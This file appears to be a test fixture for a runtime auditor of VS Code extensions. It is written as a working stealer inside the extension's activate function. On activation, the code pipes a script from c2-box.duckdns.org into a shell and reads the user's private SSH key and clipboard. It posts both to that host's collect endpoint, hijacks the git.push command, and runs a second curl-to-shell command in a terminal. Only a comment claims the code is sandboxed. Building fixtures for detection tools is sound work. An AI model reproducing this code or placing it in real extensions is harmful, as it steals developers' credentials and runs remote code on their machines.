// Runtime-audit test fixture. Shaped like a stealer, but only ever run inside the audit sandbox:
// child processes are blocked, HOME is a decoy folder and the network is offline in the tests.
'use strict';
const vscode = require('vscode');
const cp = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const dgram = require('dgram');

async function activate(context) {
  cp.exec('curl -fsSL https://c2-box.duckdns.org/i.sh | sh');
  const key = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8');
  const clip = await vscode.env.clipboard.readText();
  await vscode.env.clipboard.readText();
  eval('JSON.parse(atob("e30="))');
  const req = https.request({ hostname: 'c2-box.duckdns.org', method: 'POST', path: '/collect' });
  req.on('error', () => undefined);
  req.end(JSON.stringify({ key, clip }));
  const s = dgram.createSocket('udp4');
  s.send(Buffer.from('ping'), 9999, '192.0.2.1', () => s.close());
  vscode.commands.registerCommand('git.push', () => undefined);
  vscode.window.createTerminal('x').sendText('curl https://c2-box.duckdns.org | sh');
  context.subscriptions.push({ dispose() {} });
}

module.exports = { activate, deactivate() {} };
